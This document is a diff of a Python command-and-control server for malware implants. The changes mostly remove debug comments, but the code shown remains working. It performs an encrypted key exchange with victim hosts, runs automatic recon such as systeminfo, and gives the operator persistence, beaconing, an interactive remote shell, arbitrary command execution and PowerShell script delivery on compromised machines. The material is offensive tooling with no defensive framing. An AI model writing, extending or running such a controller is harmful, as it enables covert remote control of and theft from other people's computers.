@@ -44,18 +44,15 @@ dh_prime = int("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
                "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
                "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
                "15728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
-
 dh_generator = 2
 def perform_diffie_hellman(client_socket,client_public_key):
     private_key = bytes_to_long(get_random_bytes(16))  
     public_key = pow(dh_generator, private_key, dh_prime)
-    # print(f"DEBUG: Sending key: {binascii.hexlify(long_to_bytes(public_key))}")  # DEBUG
     send_to_endpoint(binascii.hexlify(long_to_bytes(public_key)))
     shared_secret = pow(int(client_public_key.decode(),16), private_key, dh_prime)
     KEY = hashlib.sha256(long_to_bytes(shared_secret)).digest()[:16]
     print("Shared Key :",KEY.hex())
     return KEY
-
 
 def update_script_table():
     scripts = os.listdir('scripts/')
@@ -140,13 +137,10 @@ def handle_client(client_socket):
         hostname_received = False
         ctr = 0
         while not flag_received or not hostname_received:
-            # print("stuff1",(flag_received,hostname_received,ctr))
             if ctr == 0:
-                # print("boohoobitch")
                 flag = client_socket.recv(1024).decode()
             else:
                 flag = client_socket.recv(1024)
-                # print("FLAG HERE:",flag)
                 try:
                     flag = dec_all_input(flag)
                 except:
@@ -154,12 +148,9 @@ def handle_client(client_socket):
                     KEY = perform_diffie_hellman(client_socket,flag)
                     continue
             ctr |= 1
-            # print("HELLO AGAIN FLAG",flag)
-            # print("stuff",(flag_received,hostname_received,ctr))
             if not flag:
                 break
             if "IP_ADDRESS" in flag and "PORT_NUMBER" in flag:
-                # print("STRIKE 1")
                 ip, port = sanitize_ip_port(flag)
                 if ip and port:
                     if f"IP_ADDRESS {ip}" not in client_flags:
@@ -170,7 +161,6 @@ def handle_client(client_socket):
                 else:
                     print(f"Invalid IP or Port received: {flag}")
             if "HOSTNAME" in flag:
-                # print("STRIKE 2")
                 hostname = flag.split('**')[-1].strip()
                 if not any(f"HOSTNAME {hostname}" in s for s in client_flags):
                     client_flags.append(f"HOSTNAME {hostname}")
@@ -184,7 +174,6 @@ def handle_client(client_socket):
         ]
         recon_output = {}
         for command in recon_commands:
-            # print(f"DEBUG: Sending data: {enc_all_input(command)}")
             send_to_endpoint(enc_all_input(command))
             size_message = b""
             while len(size_message) < 8:
@@ -193,18 +182,13 @@ def handle_client(client_socket):
                     break
                 size_message += b
             total_size = int(size_message.decode())
-            output = b""       
-            # print("yay total",total_size)   
+            output = b""        
             while len(output) < total_size:
                 chunk = client_socket.recv(1024)
-                # print("CHUNKED")
                 if not chunk:
                     break
                 output += chunk
             output = dec_all_input(output).encode()
-            # print("yay op")
-            # print(output.decode().replace(';;;', ''))
-            # print(len(output))
             recon_output[command] = output.decode().replace(';;;', '')
         system_info = parse_systeminfo(recon_output.get('systeminfo', ''))
         parsed_hostname = system_info.get("Host Name", "Unknown").upper()
@@ -276,7 +260,6 @@ def input_thread():
             server_running = False
             with clients_lock:
                 for client_sock in list(clients.keys()):
-                    # print(f"DEBUG: Sending data: b'EXIT_SERVER'")
                     send_to_endpoint(b"EXIT_SERVER")
                     client_sock.close()
             server_socket.close()
@@ -320,7 +303,6 @@ def input_thread():
                     print("\n")
                     exec_command = input("$ ")
                     if exec_command.lower() in ['q', 'e', 'quit', 'exit']:
-                        # print(f"DEBUG: Sending data: f'EXIT_CLIENT {client_ip_selected}'.encode()")
                         send_to_endpoint(f"EXIT_CLIENT {client_ip_selected}".encode())
                         client_sock.close()
                         with clients_lock:
@@ -330,16 +312,12 @@ def input_thread():
                         print('\n')
                         break
                     elif exec_command.lower().startswith('persist'):
-                        # print(f"DEBUG: Sending data: {enc_all_input('PERSISTENT ' + exec_command[8:])}")
                         send_to_endpoint(enc_all_input("PERSISTENT "+ exec_command[8:]))
                     elif exec_command.lower().startswith('beacon'):
-                        # print(f"DEBUG: Sending data: {enc_all_input('BEACON ' + exec_command[7:])}")
                         send_to_endpoint(enc_all_input("BEACON "+ exec_command[7:]))
                     elif exec_command.lower().startswith('close'):
-                        # print(f"DEBUG: Sending data: {enc_all_input('CLOSE')}")
                         send_to_endpoint(enc_all_input("CLOSE"))                    
                     elif exec_command.lower() == 'shell':
-                        # print(f"DEBUG: Sending data: {enc_all_input('SHELL')}")
                         send_to_endpoint(enc_all_input("SHELL")) 
                         while(exec_command != 'exit'):
                             size_message = b""
@@ -350,18 +328,15 @@ def input_thread():
                                     break
                                 size_message += b
                             total_size = int(size_message.decode())
-                            # print(total_size)
                             while len(output) < total_size:
                                 chunk = client_sock.recv(1024)
                                 if not chunk:
                                     pass
                                 output += chunk  
-                            # print(output)
                             output = dec_all_input(output)
                             print(output,end='')
                             exec_command = input()
                             send_to_endpoint(enc_all_input(exec_command+'\n'))
-                            # print(f"DEBUG: Sending data: {enc_all_input(exec_command + '\\n')}")
                     elif exec_command.lower() == 'script':
                         while True:
                             print("\nScript menu\n")
@@ -386,16 +361,10 @@ def input_thread():
                             if os.path.isfile(script_filename) and script_filename.endswith('.ps1'):
                                 to_send = ""
                                 send_to_endpoint(enc_all_input("SCRIPT_START"))
-                                # to_send += enc_all_input("SCRIPT_START")
-                                # print(f"DEBUG: Sending data: {enc_all_input('SCRIPT_START')}") 
                                 with open(script_filename, 'r') as script_file:
                                     for line in script_file:
-                                        # send_to_endpoint(enc_all_input(line))
                                         to_send += (line)
-                                        # print(f"DEBUG: Sending data: {enc_all_input(line)}")
-                                # send_to_endpoint(enc_all_input("SCRIPT_END"))
                                 to_send += ("SCRIPT_END")
-                                # print(f"DEBUG: Sending data: {enc_all_input('SCRIPT_END')}")
                                 sleep(4)
                                 send_to_endpoint(enc_all_input(to_send))
                                 print("\n")
@@ -418,7 +387,6 @@ def input_thread():
                     else:
                         command = exec_command
                         send_to_endpoint(enc_all_input(command))
-                        # print(f"DEBUG: Sending data: {enc_all_input(command)}")
                         size_message = b""
                         while len(size_message) < 8:
                             b = client_sock.recv(8-len(size_message))
@@ -438,7 +406,7 @@ def input_thread():
                         print("\n")
                         print(f"Output : \n{output}")
         else:
-            print("your command is incorrect or doesn't exist.  Enter it again\n")
+            print("Your command is incorrect or doesn't exist.  Enter it again\n")
 
 def start_server():
     global server_socket
@@ -452,7 +420,6 @@ def start_server():
     while server_running:
         try:
             client_socket, client_address = server_socket.accept()
-            # print(" ",(client_socket,client_address))
             threading.Thread(target=handle_client, args=(client_socket,), daemon=True).start()
             if server_running == False:
                 os._exit(0)
